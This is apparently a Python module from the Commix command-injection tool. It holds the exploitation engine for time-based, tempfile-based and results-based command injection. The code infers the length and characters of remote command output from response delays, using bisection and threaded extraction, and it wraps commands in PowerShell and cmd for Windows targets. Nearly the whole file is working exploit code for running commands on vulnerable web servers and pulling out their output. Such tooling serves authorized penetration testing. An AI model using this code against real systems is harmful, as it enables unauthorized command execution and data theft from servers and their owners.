#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2026 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""

import re
import os
import sys
import time
import json
import string
import random
import statistics
import threading
try:
  import concurrent.futures
  _THREADS_SUPPORTED = True
except ImportError:
  # "concurrent.futures" needs Python 3.2+; fall back to serial on Python 2.
  _THREADS_SUPPORTED = False
from src.utils import menu
from src.utils import settings
from src.core.requests import proxy
from src.core.requests import headers
from src.core.requests import requests
from src.core.requests import parameters
from src.core.requests import stability
from src.utils import common
from src.core.injections.controller import checks
from src.utils import session_handler
from src.thirdparty.six.moves import urllib as _urllib
from src.thirdparty.six.moves import input as _input
from src.thirdparty.six.moves import html_parser as _html_parser
from src.thirdparty.colorama import Fore, Back, Style, init

"""
Abort the thread pool on SystemExit; KeyboardInterrupt is handled by the caller.
"""
def _abort_executor(executor, exc):
  executor.shutdown(wait=False, cancel_futures=True)
  os._exit(exc.code if isinstance(exc.code, int) else 0)

"""
The main time-realative command injection exploitation.
"""
def time_related_injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response, technique):

  if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
    from src.core.injections.blind.techniques.time_based import tb_payloads as payloads
  else:
    from src.core.injections.semiblind.techniques.tempfile_based import tfb_payloads as payloads

  if settings.TARGET_OS == settings.OS.WINDOWS:
    previous_cmd = cmd
    if alter_shell:
      if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
        cmd = settings.WIN_PYTHON_INTERPRETER + " -c \"import os; print len(os.popen('cmd /c " + cmd + "').read().strip())\""
      else:
        cmd = checks.quoted_cmd(cmd)
    else:
      if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
        cmd = "powershell.exe -InputFormat none write-host ([string](cmd /c " + cmd + ")).trim().length"
      else:
        cmd = "powershell.exe -InputFormat none write-host ([string](cmd /c " + cmd + ")).trim()"

  if menu.options.file_write:
    minlen = 0
  else:
    minlen = 1

  # Reuse the calibrated timesec instead of recalibrating it for every command.
  if settings.CALIBRATED_TIMESEC is not None:
    timesec = settings.CALIBRATED_TIMESEC

  found_chars = False
  # Warn about network load once before the first command that needs it.
  checks.time_related_attaks_msg()

  # Ask upfront instead of waiting for the first delayed response.
  if settings.EXPLOITATION_PHASE and settings.ADJUST_TIME_DELAY_CHOICE is None:
    msg = "Do you want commix to try to optimize the value(s) for delay responses (option '--time-sec')? [Y/n] "
    settings.ADJUST_TIME_DELAY_CHOICE = common.read_input(msg, default="Y", check_batch=True) in settings.CHOICE_YES

  # An interrupted prior run's partial value carries an already-confirmed length.
  _stored_partial = None
  if not menu.options.ignore_session:
    _candidate = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
    if _candidate is not None and _candidate.startswith(settings.PARTIAL_VALUE_MARKER):
      _stored_partial = _candidate
  _cached_length = None
  if _stored_partial is not None:
    try:
      _cached_length = int(_stored_partial[len(settings.PARTIAL_VALUE_MARKER):].split(":", 1)[0])
    except ValueError:
      _cached_length = None

  def _warm_up_baseline():
    if len(settings.RESPONSE_TIMES) < settings.MIN_TIME_RESPONSES:
      info_msg = "Time-related response comparison requires a larger statistical model"
      info_msg += "." if settings.VERBOSITY_LEVEL != 0 else ", please wait..."
      settings.print_data_to_stdout(settings.END_LINE.CR + settings.print_info_msg(info_msg))

      def _probe():
        # A candidate no real output could reach, so this never sleeps - a safe, fast sample.
        safe_candidate = int(maxlen) * 2 + 100
        if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
          probe = payloads.get_length(separator, cmd, safe_candidate, timesec, http_request_method)
        else:
          probe = payloads.cmd_execution(separator, cmd, safe_candidate, OUTPUT_TEXTFILE, timesec, http_request_method)
        exec_time, _, _, _, _ = requests.perform_injection(prefix, suffix, whitespace, probe, vuln_parameter, http_request_method, url)
        checks.record_baseline_response_time(exec_time)
        # Skip dots in verbose mode; payload debug lines already show progress.
        if settings.VERBOSITY_LEVEL == 0:
          settings.print_data_to_stdout(".")

      # Sample with the same concurrency as extraction; a serial baseline underestimates response time.
      fan_out = settings.THREADS if (settings.THREADS > 1 and _THREADS_SUPPORTED) else 1
      while len(settings.RESPONSE_TIMES) < settings.MIN_TIME_RESPONSES:
        try:
          if fan_out > 1:
            with concurrent.futures.ThreadPoolExecutor(max_workers=fan_out) as executor:
              concurrent.futures.wait([executor.submit(_probe) for _ in range(fan_out)])
          else:
            _probe()
        except KeyboardInterrupt:
          checks.handle_exploitation_interrupt(filename, url)
      if settings.VERBOSITY_LEVEL == 0:
        settings.print_data_to_stdout(" (done)")

  # Flags this run's output as suspect if the connection is (or was already found to be) lagging.
  def _check_lagging():
    nonlocal length_suspect, lagging_detected
    if checks.check_lagging():
      length_suspect = lagging_detected = True

  # Guard timesec so concurrent payloads use the same value for sending and validation.
  timesec_lock = threading.Lock()

  # Shrink the delay on a clearly-good read - no static floor, the stdev term self-protects jittery targets.
  delay_candidates = [0] * settings.TIME_DELAY_CANDIDATES
  def _adjust_time_delay(exec_time, lower_limit):
    nonlocal timesec
    if settings.ADJUST_TIME_DELAY_DISABLED or settings.ADJUST_TIME_DELAY_CHOICE == False:
      return
    candidate = settings.TIME_DELAY_STEP + int(round(lower_limit))
    with timesec_lock:
      delay_candidates.insert(0, candidate)
      del delay_candidates[settings.TIME_DELAY_CANDIDATES:]
      if len(set(delay_candidates)) == 1 and candidate < timesec:
        if exec_time / (1.0 * timesec / candidate) > settings.MIN_VALID_DELAYED_RESPONSE:
          timesec = settings.CALIBRATED_TIMESEC = candidate
          info_msg = "Adjusting time delay to " + str(timesec) + " second" + ("s" if timesec > 1 else "") + " due to good response times."
          settings.print_data_to_stdout(settings.print_info_msg(info_msg))

  # Track clean runs to resume auto-adjustment after a raised delay.
  def _note_validation_result(retried):
    with timesec_lock:
      if retried:
        settings.VALIDATION_RUN = 0
        return
      settings.VALIDATION_RUN += 1
      if settings.ADJUST_TIME_DELAY_DISABLED and settings.VALIDATION_RUN > settings.VALID_TIME_CHARS_RUN_THRESHOLD:
        settings.ADJUST_TIME_DELAY_DISABLED = False
        if settings.VERBOSITY_LEVEL != 0:
          debug_msg = "Turning back on the time delay auto-adjustment mechanism."
          settings.print_data_to_stdout(settings.print_debug_msg(debug_msg))

  length_suspect = False
  lagging_detected = False

  # Measure once with retries and the shared adaptive delay model for both techniques.
  def _measure_length(payload):
    nonlocal length_suspect
    exec_time = 0
    errors_before = settings.VISIBLE_CONNECTION_ERRORS
    for attempt in range(5):
      before = settings.TOTAL_OF_REQUESTS
      exec_time, _, _, _, _ = requests.perform_injection(prefix, suffix, whitespace, payload, vuln_parameter, http_request_method, url)
      if not stability.request_was_retried(before):
        break
    if settings.VISIBLE_CONNECTION_ERRORS != errors_before:
      length_suspect = True
    decision = checks.time_related_shell(url_time_response, exec_time, timesec)
    if not decision:
      checks.record_baseline_response_time(exec_time)
    else:
      lower_limit = checks.current_delay_threshold()
      if lower_limit is not None:
        _adjust_time_delay(exec_time, lower_limit)
    if settings.VERBOSITY_LEVEL == 0:
      settings.print_data_to_stdout(".")
    return decision

  _warm_up_baseline()
  _check_lagging()

  # Close the warm-up dots line before starting a new spinner line.
  settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)

  output_length = None
  if _cached_length is not None:
    # Length already confirmed by the interrupted run this is resuming - reuse it
    # instead of redoing the whole bisection/validation dance.
    output_length = _cached_length
    found_chars = True
    if technique == settings.INJECTION_TECHNIQUE.TEMP_FILE_BASED and not alter_shell:
      # Convert leftover raw file output to decimal before extraction starts.
      payload = payloads.cmd_execution(separator, cmd, output_length, OUTPUT_TEXTFILE, timesec, http_request_method)
      _measure_length(payload)
    info_msg = "Reusing the previously retrieved output length: " + str(output_length)
    settings.print_data_to_stdout(settings.print_info_msg(info_msg))
  else:
    info_msg = "Retrieving the length of execution output"
    if settings.TEMPFILE_BASED_STATE:
      info_msg += " from file '" + OUTPUT_TEXTFILE + "'"
    info_msg += "." if settings.VERBOSITY_LEVEL != 0 else ", please wait..."
    settings.print_data_to_stdout(settings.END_LINE.CR + settings.print_info_msg(info_msg))

    # The tempfile-based oracle now also tests <= (not just ==), so it bisects the same way
    # as time-based - only the experimental alter_shell path is still exact-match-only.
    if not (technique == settings.INJECTION_TECHNIQUE.TEMP_FILE_BASED and alter_shell):
      # Binary search the output length, mirroring _bisect_once() below.
      def _length_delayed(candidate):
        if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
          if alter_shell:
            payload = payloads.get_length_alter_shell(separator, cmd, candidate, timesec, http_request_method)
          else:
            payload = payloads.get_length(separator, cmd, candidate, timesec, http_request_method)
        else:
          payload = payloads.cmd_execution(separator, cmd, candidate, OUTPUT_TEXTFILE, timesec, http_request_method)
        return _measure_length(payload)

      def _bisect_length():
        lo = int(minlen) - 1
        hi = int(maxlen) - 1
        # Confirm the upper-bound fast path twice, so Continue/verbosity resumes this same step.
        while True:
          try:
            if hi >= int(minlen) and _length_delayed(hi) and _length_delayed(hi):
              return hi
            break
          except KeyboardInterrupt:
            checks.handle_exploitation_interrupt(filename, url)
        # A single value to find, nothing to distribute across threads - stays serial.
        while hi - lo > 1:
          try:
            mid = (lo + hi) // 2
            if _length_delayed(mid):
              lo = mid
            else:
              hi = mid
          except KeyboardInterrupt:
            checks.handle_exploitation_interrupt(filename, url)
        return lo if lo >= int(minlen) else None

      output_length = _bisect_length()

      if output_length is not None:
        # Verify the bisection boundary independently; sustained bias can converge on the wrong boundary.
        def _boundary_holds(candidate):
          if not _length_delayed(candidate):
            return False
          if candidate + 1 < int(maxlen) and _length_delayed(candidate + 1):
            return False
          return True

        # Independently verify with "-eq" instead of "-le" to catch systematic comparison bias; no-op for time-based.
        def _exact_length_confirmed(candidate):
          if technique != settings.INJECTION_TECHNIQUE.TEMP_FILE_BASED:
            return True
          payload = payloads.cmd_execution(separator, cmd, candidate, OUTPUT_TEXTFILE, timesec, http_request_method, operator="-eq")
          return _measure_length(payload)

        # Always require 2 consecutive confirmations, never trust one read alone.
        # Best-of-3 vote once jitter has been seen, for a stronger guarantee.
        def _validate_boundary(candidate):
          if settings.JITTER_SEEN:
            votes = [_boundary_holds(candidate) for _ in range(3)]
            same_mechanism_ok = votes.count(True) >= 2
          else:
            same_mechanism_ok = _boundary_holds(candidate) and _boundary_holds(candidate)
          return same_mechanism_ok and _exact_length_confirmed(candidate)

        revalidations = 0
        original_timesec = timesec
        while True:
          try:
            validated = _validate_boundary(output_length)
          except KeyboardInterrupt:
            checks.handle_exploitation_interrupt(filename, url)
            continue
          if validated:
            break
          was_jittery = settings.JITTER_SEEN
          settings.JITTER_SEEN = True
          settings.ADJUST_TIME_DELAY_DISABLED = True
          max_revalidations = settings.MAX_LENGTH_REVALIDATIONS * (3 if was_jittery else 1)
          if revalidations >= max_revalidations:
            length_suspect = True
            # Escalation failed; revert instead of carrying the raised delay into later positions.
            timesec = settings.CALIBRATED_TIMESEC = original_timesec
            break
          revalidations += 1
          settings.print_data_to_stdout(settings.print_error_msg("Invalid length detected. Retrying.."))
          # User declined delay optimization - retry at the same delay, never raise it.
          if settings.ADJUST_TIME_DELAY_CHOICE != False:
            timesec = settings.CALIBRATED_TIMESEC = timesec + settings.TIME_DELAY_STEP
            warn_msg = "Increasing time delay to " + str(timesec) + " second" + ("s" if timesec > 1 else "") + "."
            settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
          output_length = _bisect_length()
          if output_length is None:
            length_suspect = True
            break
        _note_validation_result(revalidations > 0)

      if output_length is not None:
        found_chars = True
        if technique == settings.INJECTION_TECHNIQUE.TEMP_FILE_BASED:
          # The boundary check leaves raw output; convert it to decimal before extraction starts.
          _length_delayed(output_length)
    else:
      # Experimental alter_shell path only - its oracle is still exact-match, not bisectable.
      for candidate_length in range(int(minlen), int(maxlen)):
        payload = payloads.cmd_execution_alter_shell(separator, cmd, candidate_length, OUTPUT_TEXTFILE, timesec, http_request_method)
        if _measure_length(payload):
          output_length = candidate_length
          found_chars = True
          break

    if settings.VERBOSITY_LEVEL == 0 and found_chars:
      settings.print_data_to_stdout(" (done)")

  if length_suspect:
    warn_msg = "The detected output length may be unreliable due to connection instability. Consider re-running to confirm it."
    settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))

  if _cached_length is None and found_chars == True and output_length > 1:
    info_msg = "Retrieved length: " + str(output_length)
    settings.print_data_to_stdout(settings.print_info_msg(info_msg))

  # Proceed with the next (injection) step!
  if found_chars == True :
    if settings.TARGET_OS == settings.OS.WINDOWS:
      cmd = previous_cmd
    num_of_chars = output_length + 1
    check_start = 0
    check_end = 0
    check_start = time.time()
    output = []
    # Position -> resolved ordinal (>= 0), shared by both loops; -1 marks "attempted, no delay found".
    UNRESOLVED_POSITION = -1
    results_by_position = {}
    failed_positions = set()
    if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
      base_progress_msg = "Retrieving the execution output."
    else:
      base_progress_msg = "Retrieving the execution output from file '" + OUTPUT_TEXTFILE + "'."
    if settings.VERBOSITY_LEVEL == 0 :
      info_msg = base_progress_msg.rstrip(".") + ": "
    else:
      info_msg = base_progress_msg + settings.END_LINE.LF
    # Skip when resuming; _load_partial_progress() prints the resume header and progress line.
    if output_length > 1 and _cached_length is None:
      settings.print_data_to_stdout(settings.END_LINE.CR + settings.print_info_msg(info_msg))

    # Share confirmed ordinals across positions; use the observed charset when small enough, with full-range fallback.
    observed_chars = set()
    observed_count = [0]
    char_frequency = {}
    observed_chars_lock = threading.Lock()

    # Renders positions resolved so far, order-independent: "_" not attempted, "?" no delay found.
    def _render_output_so_far():
      furthest = 0
      chars = []
      for pos in range(1, output_length + 1):
        ascii_char = results_by_position.get(pos)
        if ascii_char == UNRESOLVED_POSITION:
          chars.append("?")
          furthest = pos
        elif ascii_char is not None:
          ch = chr(ascii_char)
          chars.append(ch if ch.isprintable() else " ")
          furthest = pos
        else:
          chars.append("_")
      if furthest == 0:
        return ""
      width = settings.PROGRESS_DISPLAY_WIDTH
      start = max(1, furthest - width + 1)
      text = "".join(chars[start - 1:furthest])
      if start > 1:
        text = ".." + text[2:]
      if furthest - start + 1 == width and furthest < output_length:
        text = text[:-2] + ".."
      return text

    def _print_progress():
      if settings.VERBOSITY_LEVEL == 0:
        progress_msg = base_progress_msg.rstrip(".") + ": " + _render_output_so_far()
        settings.print_data_to_stdout(settings.END_LINE.CR + settings.print_info_msg(progress_msg))

    # Pre-populates results_by_position from an interrupted prior run's partial value.
    def _load_partial_progress():
      if _stored_partial is None:
        return
      body = _stored_partial[len(settings.PARTIAL_VALUE_MARKER):]
      try:
        stored_length, pairs = body.split(":", 1)
        # Length mismatch - stored positions no longer line up, don't resume into it.
        if int(stored_length) != output_length:
          return
        for pair in pairs.split(","):
          if not pair:
            continue
          pos_str, ord_str = pair.split("=")
          results_by_position[int(pos_str)] = int(ord_str)
      except ValueError:
        return
      if results_by_position:
        info_msg = "Resuming the previously interrupted extraction (" + str(len(results_by_position)) + "/" + str(output_length) + " character(s) already retrieved)."
        settings.print_data_to_stdout(settings.print_info_msg(info_msg))
        _print_progress()

    # Persists progress so far, partial unless every position is done - called
    # before any interrupt-triggered exit.
    def _save_progress():
      if menu.options.ignore_session:
        return
      resolved = dict((pos, ordinal) for pos, ordinal in results_by_position.items()
                      if ordinal is not None and ordinal != UNRESOLVED_POSITION)
      if len(resolved) >= len(positions):
        value = "".join(chr(resolved[pos]) for pos in positions)
      else:
        pairs = ",".join(str(pos) + "=" + str(ordinal) for pos, ordinal in sorted(resolved.items()))
        value = settings.PARTIAL_VALUE_MARKER + str(output_length) + ":" + pairs
      session_handler.store_cmd(url, cmd, value, vuln_parameter)

    def _bisect_once(num_of_chars, char_pool):
      nonlocal timesec
      # Binary search over the character's ordinal value.
      min_ord = min(char_pool)
      max_ord = max(char_pool)
      conn_error_flag = False

      def _char_delayed(candidate, operator="-le"):
        nonlocal conn_error_flag
        # Snapshot once - another thread changing timesec mid-flight would judge
        # this response against a value its payload was never sent with.
        with timesec_lock:
          local_timesec = timesec
        payload = payloads.get_char(separator, cmd, num_of_chars, candidate, local_timesec, http_request_method, operator=operator) if technique == settings.INJECTION_TECHNIQUE.TIME_BASED else payloads.get_char(separator, OUTPUT_TEXTFILE, num_of_chars, candidate, local_timesec, http_request_method, operator=operator)
        exec_time = 0
        errors_before = settings.VISIBLE_CONNECTION_ERRORS
        for attempt in range(5):
          before = settings.TOTAL_OF_REQUESTS
          exec_time, _, _, _, _ = requests.perform_injection(prefix, suffix, whitespace, payload, vuln_parameter, http_request_method, url)
          if not stability.request_was_retried(before):
            break
        if settings.VISIBLE_CONNECTION_ERRORS != errors_before:
          conn_error_flag = True
        decision = checks.time_related_shell(url_time_response, exec_time, local_timesec)
        if not decision:
          checks.record_baseline_response_time(exec_time)
        else:
          lower_limit = checks.current_delay_threshold()
          if lower_limit is not None:
            _adjust_time_delay(exec_time, lower_limit)
        return decision

      def _bisect_chars(force_full=False):
        lo = min_ord - 1
        hi = max_ord
        # Confirm the fast path twice; threaded mode re-raises so only the main thread prompts.
        while True:
          try:
            if _char_delayed(hi) and _char_delayed(hi):
              return hi, True
            break
          except KeyboardInterrupt:
            if threaded:
              raise
            checks.handle_exploitation_interrupt(filename, url)

        if not force_full:
          # Probe frequent characters first; skewed distributions can resolve positions in a few requests.
          with observed_chars_lock:
            top_candidates = sorted(char_frequency, key=char_frequency.get, reverse=True)[:settings.FREQUENCY_PROBE_TOP_K]
          for candidate in top_candidates:
            while True:
              try:
                if _char_delayed(candidate, operator="-eq"):
                  return candidate, False
                break
              except KeyboardInterrupt:
                if threaded:
                  raise
                checks.handle_exploitation_interrupt(filename, url)

          with observed_chars_lock:
            eligible = (observed_count[0] >= settings.NARROWING_MIN_OBSERVED
                        and len(observed_chars) <= settings.NARROWING_MAX_SET_SIZE)
            narrowed = sorted(observed_chars) if eligible else None
          if narrowed:
            # Binary-search the narrowed set by index; keep hi as an exclusive sentinel.
            nlo, nhi = -1, len(narrowed)
            while nhi - nlo > 1:
              try:
                nmid = (nlo + nhi) // 2
                if _char_delayed(narrowed[nmid]):
                  nlo = nmid
                else:
                  nhi = nmid
              except KeyboardInterrupt:
                if threaded:
                  raise
                checks.handle_exploitation_interrupt(filename, url)
            if nlo >= 0:
              # The value may be outside this set; boundary validation catches and escalates misses.
              return narrowed[nlo], False

        # Keep each character's bisection serial; threads only process different positions concurrently.
        while hi - lo > 1:
          try:
            mid = (lo + hi) // 2
            if _char_delayed(mid):
              lo = mid
            else:
              hi = mid
          except KeyboardInterrupt:
            if threaded:
              raise
            checks.handle_exploitation_interrupt(filename, url)
        return (lo, True) if lo >= min_ord else (None, True)

      ascii_char, from_full_range = _bisect_chars()

      if ascii_char is not None:
        # Re-probe with equality before accepting - one request when clean,
        # best-of-3 once jitter is seen.
        def _validate_char_boundary(candidate):
          if settings.JITTER_SEEN:
            votes = [_char_delayed(candidate, operator="-eq") for _ in range(3)]
            return votes.count(True) >= 2
          return _char_delayed(candidate, operator="-eq")

        revalidations = 0
        original_timesec = timesec
        while True:
          try:
            validated = _validate_char_boundary(ascii_char)
          except KeyboardInterrupt:
            if threaded:
              raise
            checks.handle_exploitation_interrupt(filename, url)
            continue
          if validated:
            break
          if not from_full_range:
            # Re-search the full range before treating a narrowed-set miss as timing noise.
            ascii_char, from_full_range = _bisect_chars(force_full=True)
            if ascii_char is None:
              conn_error_flag = True
              break
            continue
          was_jittery = settings.JITTER_SEEN
          settings.JITTER_SEEN = True
          settings.ADJUST_TIME_DELAY_DISABLED = True
          max_revalidations = settings.MAX_LENGTH_REVALIDATIONS * (3 if was_jittery else 1)
          if revalidations >= max_revalidations:
            conn_error_flag = True
            # Escalation failed; revert instead of carrying the raised delay into later positions.
            with timesec_lock:
              timesec = settings.CALIBRATED_TIMESEC = original_timesec
            break
          revalidations += 1
          settings.print_data_to_stdout(settings.print_error_msg("Invalid character detected. Retrying."))
          # User declined delay optimization - retry at the same delay, never raise it.
          if settings.ADJUST_TIME_DELAY_CHOICE != False:
            # Lock the update to avoid lost or double-counted increments from concurrent positions.
            with timesec_lock:
              timesec = settings.CALIBRATED_TIMESEC = timesec + settings.TIME_DELAY_STEP
              new_timesec = timesec
            warn_msg = "Increasing time delay to " + str(new_timesec) + " second" + ("s" if new_timesec > 1 else "") + "."
            settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
          ascii_char, from_full_range = _bisect_chars(force_full=True)
          if ascii_char is None:
            conn_error_flag = True
            break
        _note_validation_result(revalidations > 0)

      if ascii_char is not None:
        with observed_chars_lock:
          observed_chars.add(ascii_char)
          observed_count[0] += 1
          char_frequency[ascii_char] = char_frequency.get(ascii_char, 0) + 1

      return ascii_char, conn_error_flag

    def _extract_position(num_of_chars):
      nonlocal timesec
      char_pool = checks.generate_char_pool(num_of_chars)

      if alter_shell:
        # Alternative shells are still experimental.
        target = cmd if technique == settings.INJECTION_TECHNIQUE.TIME_BASED else OUTPUT_TEXTFILE

        def _delayed(candidate, operator, local_timesec):
          payload = payloads.get_char_alter_shell(separator, target, num_of_chars, candidate, local_timesec, http_request_method, operator=operator)
          exec_time, _, _, _, _ = requests.perform_injection(prefix, suffix, whitespace, payload, vuln_parameter, http_request_method, url)
          # Use the adaptive threshold instead of fixed values calibrated to a timesec that may have shrunk.
          return checks.time_related_shell(url_time_response, exec_time, local_timesec)

        def _bisect(local_timesec):
          lo, hi = min(char_pool) - 1, max(char_pool)
          while hi - lo > 1:
            mid = (lo + hi) // 2
            if _delayed(mid, "-le", local_timesec):
              lo = mid
            else:
              hi = mid
          return lo if lo >= min(char_pool) else None

        # Verify the bisection boundary independently; a noisy read can permanently steer it wrong.
        def _boundary_holds(candidate, local_timesec):
          if not _delayed(candidate, "-le", local_timesec):
            return False
          if candidate + 1 <= max(char_pool) and _delayed(candidate + 1, "-le", local_timesec):
            return False
          return True

        def _validate(candidate, local_timesec):
          if settings.JITTER_SEEN:
            votes = [_boundary_holds(candidate, local_timesec) for _ in range(3)]
            holds = votes.count(True) >= 2
          else:
            holds = _boundary_holds(candidate, local_timesec) and _boundary_holds(candidate, local_timesec)
          return holds and _delayed(candidate, "-eq", local_timesec)

        revalidations = 0
        original_timesec = timesec
        candidate = _bisect(timesec)
        while True:
          try:
            validated = candidate is not None and _validate(candidate, timesec)
          except KeyboardInterrupt:
            checks.handle_exploitation_interrupt(filename, url)
            continue
          if validated:
            return num_of_chars, candidate, False
          was_jittery = settings.JITTER_SEEN
          settings.JITTER_SEEN = True
          settings.ADJUST_TIME_DELAY_DISABLED = True
          max_revalidations = settings.MAX_LENGTH_REVALIDATIONS * (3 if was_jittery else 1)
          if revalidations >= max_revalidations:
            with timesec_lock:
              timesec = settings.CALIBRATED_TIMESEC = original_timesec
            return num_of_chars, None, True
          revalidations += 1
          settings.print_data_to_stdout(settings.print_error_msg("Invalid character detected. Retrying."))
          if settings.ADJUST_TIME_DELAY_CHOICE != False:
            with timesec_lock:
              timesec = settings.CALIBRATED_TIMESEC = timesec + settings.TIME_DELAY_STEP
          candidate = _bisect(timesec)

      # One bisection per position - the corruption check below catches systematic bias instead.
      ascii_char, conn_error_flag = _bisect_once(num_of_chars, char_pool)
      return num_of_chars, ascii_char, conn_error_flag

    positions = list(range(1, int(num_of_chars)))
    _load_partial_progress()
    positions_to_extract = [pos for pos in positions if pos not in results_by_position]
    conn_error_positions = set()
    # Asked once already in do_time_related_proccess(), before this ever runs.
    threaded = settings.THREADS > 1 and _THREADS_SUPPORTED and settings.THREADED_TIME_RETRIEVAL_CHOICE != False
    if not threaded:
      remaining = positions_to_extract
      while remaining:
        try:
          for pos in remaining:
            _, ascii_char, conn_error_flag = _extract_position(pos)
            if ascii_char is None:
              failed_positions.add(pos)
            results_by_position[pos] = UNRESOLVED_POSITION if ascii_char is None else ascii_char
            if conn_error_flag:
              conn_error_positions.add(pos)
            _print_progress()
          remaining = []
        except SystemExit:
          _save_progress()
          raise
        except KeyboardInterrupt:
          # Defensive fallback - should already be absorbed inside _bisect_once()/_bisect_chars().
          _save_progress()
          checks.handle_exploitation_interrupt(filename, url)
          remaining = [pos for pos in positions_to_extract if results_by_position.get(pos) is None]
    else:
      # Extract positions concurrently - never more workers than positions to fill.
      remaining = positions_to_extract
      while remaining:
        num_workers = min(settings.THREADS, len(remaining)) or 1
        executor = concurrent.futures.ThreadPoolExecutor(max_workers=num_workers)
        try:
          futures = {executor.submit(_extract_position, pos): pos for pos in remaining}
          for future in concurrent.futures.as_completed(futures):
            pos, ascii_char, conn_error_flag = future.result()
            if ascii_char is None:
              failed_positions.add(pos)
            results_by_position[pos] = UNRESOLVED_POSITION if ascii_char is None else ascii_char
            if conn_error_flag:
              conn_error_positions.add(pos)
            _print_progress()
        except SystemExit as exc:
          # Already means "leave now" (e.g. checks.quit()) - no prompting.
          _save_progress()
          _abort_executor(executor, exc)
        except KeyboardInterrupt:
          # wait=True lets in-flight workers finish, so nothing races the retry below.
          executor.shutdown(wait=True, cancel_futures=True)
          _save_progress()
          checks.handle_exploitation_interrupt(filename, url)
          remaining = [pos for pos in positions_to_extract if results_by_position.get(pos) is None]
        else:
          executor.shutdown(wait=True)
          remaining = []
    # Assemble in position order; unresolved positions are dropped, not filled with a placeholder.
    for pos in positions:
      ascii_char = results_by_position.get(pos)
      if ascii_char is not None and ascii_char != UNRESOLVED_POSITION:
        output.append(chr(ascii_char))

    # Severe instability converges on the pool's upper bound - >= 1, not >= 2, since a single occurrence already means wrong data.
    boundary_char = chr(max(settings.CHAR_POOL_MULTI))
    if output.count(boundary_char) >= 1 or conn_error_positions or lagging_detected:
      if threaded:
        warn_msg = "Concurrent (threaded) requests overloading the target may have corrupted the extracted data. Consider re-running with '--threads=1' to confirm it."
      else:
        warn_msg = "Connection instability with the target may have corrupted the extracted data. Consider re-running to confirm it."
      settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))

    if failed_positions:
      warn_msg = str(len(failed_positions)) + " of " + str(len(positions)) + " character"
      warn_msg += "s"[len(positions) == 1:] + " could not be extracted (no delay was ever observed for "
      warn_msg += ("them" if len(failed_positions) != 1 else "it") + ") - the retrieved output below is missing "
      warn_msg += ("those characters" if len(failed_positions) != 1 else "that character") + "."
      settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))

    check_end  = time.time()
    check_exec_time = int(check_end - check_start)
    output = "".join(str(p) for p in output)

    # Check for empty output.
    if output == (len(output) * settings.SINGLE_WHITESPACE):
      output = ""

  else:
    check_start = 0
    check_exec_time = 0
    output = ""

  return check_exec_time, output

"""
The main results-based command injection exploitation.
"""
def results_based_injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, technique):

  def check_injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, technique):
    if technique == settings.INJECTION_TECHNIQUE.CLASSIC or technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
      from src.core.injections.results_based.techniques.classic import cb_payloads as payloads
    elif technique == settings.INJECTION_TECHNIQUE.DYNAMIC_CODE:
      from src.core.injections.results_based.techniques.eval_based import eb_payloads as payloads
    else:
      from src.core.injections.semiblind.techniques.file_based import fb_payloads as payloads

    if alter_shell:
      if technique != settings.INJECTION_TECHNIQUE.FILE_BASED and technique != settings.INJECTION_TECHNIQUE.TEMP_FILE_BASED:
        payload = payloads.cmd_execution_alter_shell(separator, TAG, cmd)
      else:
        payload = payloads.cmd_execution_alter_shell(separator, cmd, OUTPUT_TEXTFILE)
    else:
      if technique != settings.INJECTION_TECHNIQUE.FILE_BASED and technique != settings.INJECTION_TECHNIQUE.TEMP_FILE_BASED:
        payload = payloads.cmd_execution(separator, TAG, cmd)
      else:
        payload = payloads.cmd_execution(separator, cmd, OUTPUT_TEXTFILE)
    if settings.VERBOSITY_LEVEL != 0:
      _ = cmd
      if technique == settings.INJECTION_TECHNIQUE.FILE_BASED or technique == settings.INJECTION_TECHNIQUE.TEMP_FILE_BASED:
        payload_msg = payload.replace(settings.END_LINE.LF, settings.END_LINE.ESCAPED_LF)
        if settings.COMMENT in payload_msg:
          payload = payload.split(settings.COMMENT)[0].strip()
          payload_msg = payload_msg.split(settings.COMMENT)[0].strip()
        if settings.COMMENT in cmd:  
          _ = cmd.split(settings.COMMENT)[0].strip()
      debug_msg = "Executing the '" + _ + "' command. "
      settings.print_data_to_stdout(settings.print_debug_msg(debug_msg))
    response, vuln_parameter, payload, prefix, suffix = requests.perform_injection(prefix, suffix, whitespace, payload, vuln_parameter, http_request_method, url)
    return response

  response = check_injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, technique)
  
  if technique == settings.INJECTION_TECHNIQUE.CLASSIC or technique == settings.INJECTION_TECHNIQUE.DYNAMIC_CODE:
    tries = 0
    while not response:
      if tries < (menu.options.failed_tries / 2):
        response = check_injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, technique)
        tries = tries + 1
      else:
        err_msg = "Something went wrong. The request has failed (" + str(tries) + ") times in a row."
        settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
        raise SystemExit()

  return response


"""
False-positive check and evaluation.
"""
